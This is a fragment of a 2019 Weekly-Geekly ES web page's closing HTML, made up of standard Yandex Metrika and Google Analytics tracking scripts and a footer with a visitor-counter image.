              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>